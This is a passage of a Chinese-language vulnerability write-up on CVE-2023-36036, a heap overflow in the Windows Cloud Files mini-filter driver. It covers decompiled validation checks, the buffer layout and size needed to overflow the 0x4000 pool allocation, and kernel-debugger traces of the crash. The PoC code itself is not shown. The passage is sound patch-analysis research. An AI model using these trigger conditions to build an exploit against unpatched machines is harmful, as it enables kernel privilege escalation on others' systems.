0:000> dx -r1 (*((poc3!_HSM_DATA *)0x1e0ef86769c))
(*((poc3!_HSM_DATA *)0x1e0ef86769c)) [Type: _HSM_DATA]
[+0x000] Magic : 0x70526546 [Type: unsigned long] // 12
[+0x004] Crc32 : 0x31e13b17 [Type: unsigned long] // 16
[+0x008] Length : 0x4004 [Type: unsigned long] // 20
[+0x00c] Flags : 0x2 [Type: unsigned short] // 24
[+0x00e] NumberOfElements : 0xb [Type: unsigned short] // 26
[+0x010] ElementInfos [Type: _HSM_ELEMENT_INFO [10) // 28</code></pre><p><strong>PoC构造</strong></p><p>将结构体导入到ida中，在<code>HsmpRpCommitNoLock</code>中首先对ReparseTag进行验证，而后将hsm_reparse_data和对应的长度导入到<code>HsmpRpValidateBuffer</code>函数中验证。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (reparse_data_buffer<span style="color:#f92672">-></span>ReparseTag<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFF0FFF</span>)<span style="color:#f92672">!=</span> dword_1C00235D0 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v9)<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073688821</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HsmDbgBreakOnStatus</span>(<span style="color:#ae81ff">3221278475</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">!=</span> (PDEVICE_OBJECT)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">HIDWORD</span>(WPP_GLOBAL_Control<span style="color:#f92672">-></span>Timer)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">BYTE1</span>(WPP_GLOBAL_Control<span style="color:#f92672">-></span>Timer)<span style="color:#f92672">>=</span><span style="color:#ae81ff">2u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_qiqDDd</span>(</span></span><span style="display:flex;"><span> WPP_GLOBAL_Control<span style="color:#f92672">-></span>AttachedDevice,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>i64,</span></span><span style="display:flex;"><span> v30,</span></span><span style="display:flex;"><span> a2,</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>),</span></span><span style="display:flex;"><span> v29,</span></span><span style="display:flex;"><span> dword_1C00235D0,</span></span><span style="display:flex;"><span> reparse_data_buffer<span style="color:#f92672">-></span>ReparseTag);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_8;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ReparseDataLength<span style="color:#f92672">=</span> reparse_data_buffer<span style="color:#f92672">-></span>ReparseDataLength;</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">HsmpRpValidateBuffer</span>(<span style="color:#f92672">&amp;</span>reparse_data_buffer<span style="color:#f92672">-></span>DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength);</span></span></code></pre></div><p>在<code>HsmpRpValidateBuffer</code>函数中对HSM_DATA结构体的一些字段做了如下校验。</p><ul><li>reparse_data_buffer->ReparseDataLength > 4</li><li>reparse_data_buffer->hsm_reparse_data.Flags=1</li><li>reparse_data_buffer->hsm_reparse_data.FileData.Magic = &lsquo;pReF&rsquo;</li><li>reparse_data_buffer->hsm_reparse_data.FileData.Flags = 2, 并且reparse_data_buffer->hsm_reparse_data.FileData.Crc32 == RtlComputeCrc32(0, (PUCHAR)&amp;a1->FileData.Length, v2 - 8</li><li>NumberOfElements 不为0，且最大为10，最后一个以NONE结尾</li></ul><p>特别的，从如下代码中可以看到对<code>ElementInfos[0]</code>和<code>ElementInfos[1]</code>进行了校验，容易得出如下条件：</p><ul><li><code>NumberOfElements > 1</code></li><li><code>FileData.Length >= 0x20</code></li><li>`FileData.ElementInfos[1].Type == 0xA</li><li><code>FileData.ElementInfos[1].Offset >= 8 * NumberOfElements + 16 &amp;&amp; FileData.ElementInfos[1].Offset &lt; FileData.Length</code></li><li><code>FileData.ElementInfos[1].Length == 4</code></li><li><code>FileData.ElementInfos[1].Length + FileData.ElementInfos[1].Offset &lt; 65535</code></li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span>)NumberOfElements<span style="color:#f92672">></span><span style="color:#ae81ff">1u</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Length<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x20</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (v22<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">1</span>].Type, v22<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x12u</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> ((v23<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">1</span>].Offset,<span style="color:#f92672">!</span>(_DWORD)v23)<span style="color:#f92672">||</span> v23<span style="color:#f92672">>=</span> hsm_data_length)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v23<span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Length</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (v24<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">1</span>].Length, v24<span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Length)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v24<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v23<span style="color:#f92672">>=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v23</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v24<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v23<span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Length</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v22<span style="color:#f92672">==</span><span style="color:#ae81ff">10</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v24<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(ULONG<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p_FileData<span style="color:#f92672">-></span>Magic<span style="color:#f92672">+</span> v23);</span></span><span style="display:flex;"><span> IsReparseBufferSupported<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> IsReparseBufferSupported<span style="color:#f92672">=</span><span style="color:#ae81ff">0xC0000225</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>如下代码对<code>ElementInfos[2]</code>进行了校验，有如下：</p><ul><li><code>FileData.ElementInfos[2].Offset &lt; FileData.Length</code></li><li><code>FileData.ElementInfos[2].Length &lt; FileData.Length</code></li><li><code>FileData.ElementInfos[2].Type == 6</code></li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (element_1_Data<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> IsReparseBufferSupported;</span></span><span style="display:flex;"><span> v27<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.Length;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v27<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x18</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v28<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.NumberOfElements, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span>)v28<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">2u</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> v27<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x28</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v29<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">2</span>].Type, v29<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x12u</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v30<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">2</span>].Offset, (_DWORD)v30)<span style="color:#f92672">&amp;&amp;</span> v30<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span> v28<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v30<span style="color:#f92672">></span> v27</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v31<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">2</span>].Length, v31<span style="color:#f92672">></span> v27)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> v31<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v30<span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v30</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> v31<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v30<span style="color:#f92672">></span> v27</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> v29<span style="color:#f92672">!=</span><span style="color:#ae81ff">6</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (IsReparseBufferSupported<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, v31<span style="color:#f92672">!=</span><span style="color:#ae81ff">8</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> IsReparseBufferSupported<span style="color:#f92672">=</span><span style="color:#ae81ff">0xC0000225</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>后面还有一堆校验逻辑就不贴了。</p><p>在<code>HsmpRpCommitNoLock</code>中对<code>HsmpRpValidateBuffer</code>返回值做了校验，如果<code>IsReparseBufferSupported</code>不为0则会进入报错逻辑，而在<code>HsmpRpValidateBuffer</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> IsReparseBufferSupported<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">HsmpRpValidateBuffer</span>(</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>reparse_data_buffer<span style="color:#f92672">-></span>DUMMYUNIONNAME.hsm_reparse_data,</span></span><span style="display:flex;"><span> ReparseDataLength);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HsmDbgBreakOnStatus</span>(IsReparseBufferSupported);</span></span><span style="display:flex;"><span> v32<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (IsReparseBufferSupported<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x80000000</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>i64 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>...</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HsmDbgBreakOnCorruption</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a4<span style="color:#f92672">==</span> (_BYTE)v32 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">!=</span> (PDEVICE_OBJECT)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">HIDWORD</span>(WPP_GLOBAL_Control<span style="color:#f92672">-></span>Timer)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span></span></span></code></pre></div><p>在<code>HsmpRpValidateBuffer</code>中可以看到当通过第一次校验后，如果<code>ElementInfos[1]</code>的Data &amp; 0x10 则会直接返回，此时<code>IsReparseBufferSupported=0</code>能通过校验。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span>)NumberOfElements<span style="color:#f92672">></span><span style="color:#ae81ff">1u</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Length<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x20</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (v22<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">1</span>].Type, v22<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x12u</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> ((v23<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">1</span>].Offset,<span style="color:#f92672">!</span>(_DWORD)v23)<span style="color:#f92672">||</span> v23<span style="color:#f92672">>=</span> hsm_data_length)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v23<span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Length</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (v24<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>FileData.ElementInfos[<span style="color:#ae81ff">1</span>].Length, v24<span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Length)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v24<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v23<span style="color:#f92672">>=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v23</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v24<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v23<span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Length</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v22<span style="color:#f92672">==</span><span style="color:#ae81ff">10</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v24<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> element_1_Data<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(ULONG<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p_FileData<span style="color:#f92672">-></span>Magic<span style="color:#f92672">+</span> v23);</span></span><span style="display:flex;"><span> IsReparseBufferSupported<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> IsReparseBufferSupported<span style="color:#f92672">=</span><span style="color:#ae81ff">0xC0000225</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HsmDbgBreakOnStatus</span>(IsReparseBufferSupported);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (IsReparseBufferSupported<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x80000000</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v25<span style="color:#f92672">=</span> WPP_GLOBAL_Control;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">==</span> (PDEVICE_OBJECT)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (<span style="color:#a6e22e">HIDWORD</span>(WPP_GLOBAL_Control<span style="color:#f92672">-></span>Timer)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#a6e22e">BYTE1</span>(WPP_GLOBAL_Control<span style="color:#f92672">-></span>Timer)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> IsReparseBufferSupported;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v26<span style="color:#f92672">=</span><span style="color:#ae81ff">24</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_163;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (element_1_Data<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> IsReparseBufferSupported;</span></span></code></pre></div><p>通过构造<code>ElementInfos[0]</code>和<code>ElementInfos[1]</code>可以通过<code>HsmpRpValidateBuffer</code>校验，而后漏洞触发点会读取<code>ElementInfos[10]</code>的数据和Length通过memcpy进行拷贝，所以还需要构造<code>ElementInfos[10]</code>的数据，并且<code>ElementInfos[10]</code>的Length需要超过目标缓冲区，特别的在计算CRC32后，需要通过RtlCompressBuffer压缩目标数据，并放入到FileData处。</p><p>构造多大的缓冲区？根据前面补丁分析，在补丁中限制了ReparseDataLength &lt; 0x4000，所以超过四千的部分会造成溢出，如果想溢出8个字节则需要构造0x4008 + 8 = 0x4010，依此类推，在构造缓冲区时。</p><p>如何将构造好的数据传递给驱动并在目标位置触发呢？在网上查到有类似漏洞分析文章<a href="https://zhuanlan.zhihu.com/p/392194464" target="_blank">Windows云文件迷你过滤器驱动程序中的提权漏洞(CVE-2021-31969)</a>，不难看出CVE-2021-31969修复和本次分析的漏洞CVE-2023-36036修复位置类似，都对ReparseDataLength进行了判断，所以本次PoC编写也可以借鉴。</p><p><img alt="" src="/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/4.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/5.png"/></p><p>在CVE-2021-31969分析文章中贴出了部分PoC，结合这部分PoC和前面的结构体，写出PoC也就不难了。</p><p><img alt="" src="/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/6.png"/></p><p><strong>动态调试</strong></p><p>在如下两个位置下断点</p><pre tabindex="0"><code>bp cldflt!HsmpRpCommitNoLock
bp cldflt!HsmpRpCommitNoLock+0x13de</code></pre><p>运行poc，可以看到已经进入<code>HsmpRpCommitNoLock</code>函数</p><pre tabindex="0"><code>1: kd> g
Breakpoint 0 hit
cldflt!HsmpRpCommitNoLock:
fffff804`6f6a1e88 48895c2420 mov qword ptr [rsp+20h],rbx</code></pre><p>继续运行，触发第二个断点</p><pre tabindex="0"><code>0: kd> g
Breakpoint 1 hit
cldflt!HsmpRpCommitNoLock+0x13de:
fffff804`6f6a3266 e81571faff call cldflt!memcpy (fffff804`6f64a380)</code></pre><p>此时memmove已经被优化为memcpy，而要拷贝的长度为0x3f94，dst所在的堆大小为0x4000，dst指向偏移0x74处，最多有0x3f8c大小，所以memcpy拷贝时会越界写入8个字节，造成堆溢出。</p><pre tabindex="0"><code>1: kd> rr8
r8=0000000000003f94
1: kd> !pool rcx
Pool page ffffd980717f7074 region is Paged pool
*ffffd980717f7000 : large page allocation, tag is HsRp, size is 0x4000 bytes
Owning component : Unknown (update pooltag.txt)</code></pre><p>继续运行，则在memcpy内部触发异常，因为尝试往未分配的内存里面写入00</p><pre tabindex="0"><code>0: kd> u
cldflt!memcpy+0x165:
fffff800`8186a4e5 0f2941f0 movaps xmmword ptr [rcx-10h],xmm0
0: kd> !pool rcx - 0x10
Pool page ffffe5028e4fa000 region is Paged pool
ffffe5028e4fa000 is not a valid large pool allocation, checking large session pool...
ffffe5028e4fa000 is not valid pool. Checking for freed (or corrupt) pool
Address ffffe5028e4fa000 could not be read. It may be a freed, invalid or paged out page
0: kd> rxmm0
mm0=0000000000000000</code></pre><p>对应代码为</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v25 )</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_OWORD<span style="color:#f92672">*</span>)(v15<span style="color:#f92672">+</span> v25<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_OWORD<span style="color:#f92672">*</span>)(v15<span style="color:#f92672">+</span> v25<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span><span style="color:#f92672">+</span> v13);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">__m128</span><span style="color:#f92672">*</span>)(v15<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">=</span> v14;</span></span></code></pre></div><p>以下为调用栈</p><pre tabindex="0"><code>1: kd> k
# Child-SP RetAddr Call Site
00 fffffb8a`8a45e4f8 fffff804`63717f82 nt!DbgBreakPointWithStatus
01 fffffb8a`8a45e500 fffff804`63717566 nt!KiBugCheckDebugBreak+0x12
02 fffffb8a`8a45e560 fffff804`635fd747 nt!KeBugCheck2+0x946
03 fffffb8a`8a45ec70 fffff804`63638f6f nt!KeBugCheckEx+0x107
04 fffffb8a`8a45ecb0 fffff804`63430730 nt!MiSystemFault+0x1de5ff
05 fffffb8a`8a45edb0 fffff804`6360d1d8 nt!MmAccessFault+0x400
06 fffffb8a`8a45ef50 fffff804`6f64a4e1 nt!KiPageFault+0x358
07 fffffb8a`8a45f0e8 fffff804`6f6a326b cldflt!memcpy+0x161
08 fffffb8a`8a45f0f0 fffff804`6f6a983b cldflt!HsmpRpCommitNoLock+0x13e3
09 fffffb8a`8a45f230 fffff804`6f66f0d7 cldflt!HsmiOpUpdatePlaceholderDirectory+0x57f
0a fffffb8a`8a45f320 fffff804`6f674b65 cldflt!HsmFltProcessUpdatePlaceholder+0x443
0b fffffb8a`8a45f3d0 fffff804`6f6a4504 cldflt!HsmFltProcessHSMControl+0x3d5
0c fffffb8a`8a45f500 fffff804`647264cc cldflt!HsmFltPreFILE_SYSTEM_CONTROL+0x6a4
0d fffffb8a`8a45f5a0 fffff804`64725f7a FLTMGR!FltpPerformPreCallbacksWorker+0x36c
0e fffffb8a`8a45f6c0 fffff804`64725021 FLTMGR!FltpPassThroughInternal+0xca
0f fffffb8a`8a45f710 fffff804`6475ae2f FLTMGR!FltpPassThrough+0x541
10 fffffb8a`8a45f7a0 fffff804`63410665 FLTMGR!FltpFsControl+0xbf
11 fffffb8a`8a45f800 fffff804`6380142c nt!IofCallDriver+0x55
12 fffffb8a`8a45f840 fffff804`63801081 nt!IopSynchronousServiceTail+0x34c
13 fffffb8a`8a45f8e0 fffff804`638d9ed6 nt!IopXxxControlFile+0xc71
14 fffffb8a`8a45fa20 fffff804`63610ef5 nt!NtFsControlFile+0x56
15 fffffb8a`8a45fa90 00007ff9`c648d704 nt!KiSystemServiceCopyEnd+0x25
16 00000056`01aff5b8 00007ff6`5e59167f ntdll!NtFsControlFile+0x14
17 00000056`01aff5c0 00000000`000001bc 0x00007ff6`5e59167f
18 00000056`01aff5c8 00000000`00000000 0x1bc</code></pre><p><img alt="" src="/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/3.png"/></p><p>PoC会在过几天上传到GitHub</p><pre tabindex="0"><code>https://github.com/Chestnuts4/POC</code></pre><h3 id="小结">小结</h3><p>本次漏洞分析离不开业内前辈逆向得出的_HSM_REPARSE_DATA结构体信息，这个结构体微软没有公开的文档，相关资料也很少。可以看到早在2018年，就已经逆向出了HSM相关数据结构信息。目前只有这一个仓库有相关信息，向前辈致敬。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*****************************************************************************/</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* ReparseDataHsm.h Copyright (c) Ladislav Zezula 2018 */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/*---------------------------------------------------------------------------*/</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* Interface of the HSM reparse data structures */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/*---------------------------------------------------------------------------*/</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* Date Ver Who Comment */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* -------- ---- --- ------- */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* 06.09.18 1.00 Lad The first version of ReparseDataHsm.h */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/*****************************************************************************/</span></span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/7.png"/></p><p>这里引用一下前辈的主页。</p><blockquote><p><a href="https://www.zezula.net/en/tools/main.html" target="_blank">https://www.zezula.net/en/tools/main.html</a></p></blockquote><p>整体来看，这个漏洞原理和触发方式较为简单，在使用memcpy之前没有校验长度，而修复也简单，再解压之前验证长度是否超过0x4000，超过则认为数据有错，进入到错误逻辑，从而在源头阻止了触发漏洞逻辑。</p><p>在漏洞修复处在修复上个整数下溢的漏洞时，开发人员只修复当时的整数下溢漏洞，没有去考虑长度会不会过长，某些程度来说这也是开发的粗心大意导致了这个漏洞留到现在。</p><p>在编写PoC参考了其他安全研究员已有的分析。</p><p>至于Exploit部分还得再研究一下。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36036" target="_blank">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36036</a></p><p><a href="https://zhuanlan.zhihu.com/p/392194464" target="_blank">https://zhuanlan.zhihu.com/p/392194464</a></p><p><a href="https://github.com/microsoft/Windows-classic-samples/tree/main/Samples/CloudMirror" target="_blank">https://github.com/microsoft/Windows-classic-samples/tree/main/Samples/CloudMirror</a></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/cfapi/cloud-filter-reference" target="_blank">https://learn.microsoft.com/en-us/windows/win32/cfapi/cloud-filter-reference</a></p><p><a 